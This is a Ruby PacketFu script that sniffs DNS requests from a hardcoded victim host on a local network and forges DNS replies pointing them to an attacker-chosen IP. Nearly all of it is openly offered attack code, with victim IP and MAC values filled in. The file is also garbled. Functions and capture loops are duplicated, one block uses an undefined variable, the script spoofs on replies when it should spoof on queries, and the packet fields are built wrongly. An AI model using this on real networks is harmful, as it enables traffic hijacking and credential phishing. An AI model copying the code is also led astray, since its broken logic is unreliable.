#!/usr/bin/env ruby
# KING SABRI extended Surfs Up
#
# DNS Spoof Basic script
#
require 'packetfu'
require 'pp'
include PacketFu

#
# * We need to start capturing/sniffing on specific interface
# * We need to enable promiscuous mode on our interface
# * We need to capture UDP packets on port 53 only
#
filter = "udp and port 53 and host " + "192.168.0.21"
capture = Capture.new(:iface => "wlan0",:start => true, :promisc => true, :filter => filter, :save => true)

# * We need to get the queried/requested domain
#    * We need to know the domain length
#    * We need to get the FQDN
#
# Convert DNS Payload to readable - Find The FQDN
#
def readable(raw_domain)
  # Prevent processing non domain
  if raw_domain[0].ord == 0
    puts "ERROR : THE RAW STARTS WITH 0"
    return raw_domain[1..-1]
  end

  fqdn = ""
  length_offset = raw_domain[0].ord
  full_length   = raw_domain[ 0..length_offset ].length
  domain_name   = raw_domain[(full_length - length_offset)..length_offset]

  while length_offset != 0
    fqdn << domain_name + "."
    length_offset = raw_domain[full_length].ord
    domain_name   = raw_domain[full_length + 1..full_length + length_offset]
    full_length   = raw_domain[0..full_length + length_offset].length
  end

  return fqdn.chomp!('.')
end

# * We need parse/analyze the valid UDP packets only
# * We need to make sure this packet is a DNS query
#
# Find the DNS packets
#
capture.stream.each do |pkt|
  # Make sure we can parse the packet; if we can, parse it
  if UDPPacket.can_parse?(pkt)
    @packet = Packet.parse(pkt)

    # Make sure we have a query packet
    dns_query = @packet.payload[2..3].to_s

    if dns_query == "\x01\x00"
      # Get the domain name into a readable format
      domain_name = @packet.payload[12..-1].to_s # FULL QUERY
      fqdn = readable(domain_name)

      # Ignore non query packet
      next if domain_name.nil?

      puts "DNS request for: " + fqdn
    end
  end
end

spoofing_ip = "69.171.234.21"
spoofing_ip.split('.').map {|octet| octet.to_i}.pack('c*')

response = UDPPacket.new(:config => PacketFu::Utils.ifconfig("wlan0"))
response.udp_src   = packet.udp_dst
response.udp_dst   = packet.udp_src
response.ip_saddr  = packet.ip_daddr
response.ip_daddr  = "192.168.0.21"
response.eth_daddr = "00:0C:29:38:1D:61"

def readable(raw_domain)

  # Prevent processing non domain
  if raw_domain[0].ord == 0
    puts "ERROR : THE RAW STARTS WITH 0"
    return raw_domain[1..-1]
  end

  fqdn = ""
  length_offset = raw_domain[0].ord
  full_length   = raw_domain[ 0..length_offset ].length
  domain_name   = raw_domain[(full_length - length_offset)..length_offset]

  while length_offset != 0
    fqdn << domain_name + "."
    length_offset = raw_domain[full_length].ord
    domain_name   = raw_domain[full_length + 1 .. full_length + length_offset]
    full_length   = raw_domain[0 .. full_length + length_offset].length
  end

  return fqdn.chomp!('.')
end

#
# Send Response
#
def spoof_response(packet, domain)

  attackerdomain_name = 'rubyfu.net'
  attackerdomain_ip   = '54.243.253.221'.split('.').map {|oct| oct.to_i}.pack('c*')  # Spoofing IP

  # Build UDP packet
  response = UDPPacket.new(:config => PacketFu::Utils.ifconfig("wlan0"))
  response.udp_src   = packet.udp_dst             # source port
  response.udp_dst   = packet.udp_src             # destination port
  response.ip_saddr  = packet.ip_daddr            # modem's IP address to be source
  response.ip_daddr  = packet.ip_saddr            # victim's IP address to be destination
  response.eth_daddr = packet.eth_saddr           # the victim's MAC address
  response.payload   = packet.payload[0,1]        # Transaction ID
  response.payload  += "\x81\x80"                 # Flags: Reply code: No error (0)
  response.payload  += "\x00\x01"                 # Question: 1
  response.payload  += "\x00\x00"                 # Answer RRs: 0
  response.payload  += "\x00\x00"                 # Authority RRs: 0
  response.payload  += "\x00\x00"                 # Additional RRs: 0
  response.payload  += attackerdomain_name.split('.').map do |section| # Queries | Name: , Convert domain to DNS style(the opposite of readable method)
    [section.size.chr, section.chars.map {|c| '\x%x' % c.ord}.join]
  end.join + "\x00"
  response.payload  += "\x00\x01"                 # Queries | Type: A (Host address)
  response.payload  += "\x00\x01"                 # Queries | Class: IN (0x0001)
  response.payload  += "\xc0\x0c"                 # Answer | Name: twitter.com
  response.payload  += "\x00\x01"                 # Answer | Type: A (Host address)
  response.payload  += "\x00\x01"                 # Answer | Class: IN (0x0001)
  response.payload  += "\x00\x00\x00\x25"         # Answer | Time to live: 37 seconds
  response.payload  += "\x00\x04"                 # Answer | Data length: 4
  response.payload  += attackerdomain_ip          # Answer | Addr
  response.recalc                                 # Calculate the packet
  response.to_w(response.iface)                   # Send the packet through our interface
end

filter = "udp and port 53 and host " + "192.168.0.21"
@capture = Capture.new(:iface => "wlan0", :start => true, :promisc => true, :filter => filter, :save => true)
# Find the DNS packets
@capture.stream.each do |pkt|
  # Make sure we can parse the packet; if we can, parse it
  if UDPPacket.can_parse?(pkt)
    packet = Packet.parse(pkt)

    # Get the offset of the query type: (request=\x01\x00, response=\x81\x80)
    dns_query = packet.payload[2..3].to_s

    # Make sure we have a dns query packet
    if dns_query == "\x01\x00"
      # Get the domain name into a readable format
      domain_name = packet.payload[12..-1].to_s # FULL DOMAIN
      fqdn = readable(domain_name)
      # Ignore non query packet
      next if domain_name.nil?
      puts "DNS request for: " + fqdn

    end
    # Make sure we have a dns reply packet
    if dns_query == "\x81\x80"
      domain_name = packet.payload[12..-1].to_s # FULL DOMAIN
      fqdn = readable(domain_name)
      puts "[*] Start Spoofing: " + fqdn
      spoof_response packet, domain_name
    end

  end
end
